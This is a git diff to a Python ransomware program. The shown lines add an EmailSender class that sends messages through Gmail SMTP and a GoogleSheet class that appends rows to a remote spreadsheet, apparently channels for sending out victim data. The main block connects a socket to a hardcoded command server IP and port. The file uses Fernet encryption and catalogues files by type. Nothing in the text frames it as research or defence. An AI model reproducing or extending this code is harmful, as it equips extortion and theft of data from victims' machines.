@@ -1,13 +1,16 @@
 import os
 import sys
 import psutil
+import smtplib
 from time import sleep
 from pathlib import Path
-from socket import socket, AF_INET, SOCK_STREAM
+from email.mime.text import MIMEText
 from cryptography.fernet import Fernet
+from email.mime.multipart import MIMEMultipart
+from socket import socket, AF_INET, SOCK_STREAM
 
 class Ransomware:
-    def __init__(self, host: str, port: str) -> None:
+    def __init__(self, host: str, port: int) -> None:
         self.host = host
         self.port = port
         self.server = socket(AF_INET, SOCK_STREAM)
@@ -102,8 +105,79 @@ class Ransomware:
                 file_categories[extcategory[ext]].append(str(entry))
 
         return file_categories
+
+
+class EmailSender:
+    def __init__(self, email, password) -> None:
+        self.sender_email = email
+        self.password = password
+
+    def SendEmail(self, message, receiver_email) -> bool:
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = self.sender_email
+            msg['To'] = receiver_email
+            msg['Subject'] = 'PNG'
+            msg.attach(MIMEText(message, 'plain'))
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(self.sender_email, self.password)
+            server.sendmail(self.sender_email, receiver_email, msg.as_string())
+            server.quit()
+            return True
+        except:
+            return False
+
+
+class GoogleSheet:
+    def __init__(self):
+        self.APISheet: dict = {
+            'KEY GOOGLE SHEET'
+        }
+        self.IDSheet = 'ID SHEET'
+        self.Service = self.CreateService()
     
+    def CreateService(self):
+        try:
+            credentials = SA.Credentials.from_service_account_info(
+                self.APISheet,
+                scopes = ['https://www.googleapis.com/auth/spreadsheets']
+            )
+            service = build('sheets', 'v4', credentials=credentials)
+            return service
+        except:
+            return False
     
+    def GetAllValues(self, Sheet: str = 'Sheet1') -> list:
+        result = self.Service.spreadsheets().values().get(
+            spreadsheetId = self.IDSheet,
+            range = Sheet
+        ).execute()
+        return result.get('values', [])
+    
+    def UpdateValuesInRange(self, values: list, range: str):
+        body = {
+            'values': values
+        }
+        result = self.Service.spreadsheets().values().update(
+            spreadsheetId=self.IDSheet,
+            range=range,
+            valueInputOption='RAW',
+            body=body
+        ).execute()
+        return result
+    
+    def UpdateValues(self, values, Sheet: str = 'Sheet1'):
+        Row = len(self.GetAllValues()) + 1
+        range_str = f'{Sheet}!A{Row}:F{Row}'
+        return self.UpdateValuesInRange(values, range_str)
+    
+    def UpdateColumn(self, values, Rowid, Sheet: str = 'Sheet1'):
+        range = f'{Sheet}!A{Rowid}:A'
+        return self.UpdateValuesInRange(values, range)
+
+    
+
 if __name__ == '__main__':
     RanSomWare = Ransomware('171.249.211.29', 19100)
     RanSomWare.ConnectServer()
